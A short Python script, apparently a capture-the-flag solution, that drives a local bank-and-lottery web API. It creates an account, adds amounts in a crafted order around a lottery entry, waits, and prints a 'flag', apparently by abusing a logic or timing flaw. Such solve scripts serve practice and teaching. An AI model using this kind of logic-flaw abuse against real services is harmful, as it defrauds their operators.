import requests
import time

URL = "http://localhost:8080"


class Account:

    name = None

    def __init__(self, name):
        self.create(name)
        self.name = name

    def create(self, name):
        resp = requests.post(URL + "/account", json={"name": name})
        if resp.status_code != 201:
            raise Exception("couldn't create account: status code = " + str(resp.status_code))
    
    def add_amount(self, amount):
        requests.post(URL + "/account/" + self.name + "/amount", json={"amount": amount})

    def get(self):
        resp = requests.get(URL + "/account/" + self.name)
        return resp.json()
    
    def lottery_add(self):
        requests.post(URL + "/lottery/add", json={"accountName": self.name})

    def lottery_results(self):
        resp = requests.get(URL + "/lottery/results")
        return resp.json()


def hack(user_name):
    a = Account(user_name)
    a.add_amount(90)
    a.add_amount(90)
    a.add_amount(90)

    a.lottery_add()
    a.add_amount(90)

    time.sleep(11)
    print(a.get()["flag"])


if __name__ == "__main__":
    hack("hacker")
